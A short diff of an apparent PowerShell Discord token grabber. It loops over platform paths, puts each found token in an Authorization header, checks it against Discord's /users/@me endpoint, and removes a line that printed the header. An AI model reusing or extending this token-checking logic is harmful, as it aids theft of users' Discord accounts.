@@ -368,8 +368,6 @@ foreach ($platform in $PATHS.Keys) {
                 "Authorization" = $token
             }
 
-            $header
-
             $response = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v10/users/@me" -Method GET -Headers $header
 
             if ($response.StatusCode -eq 200) {
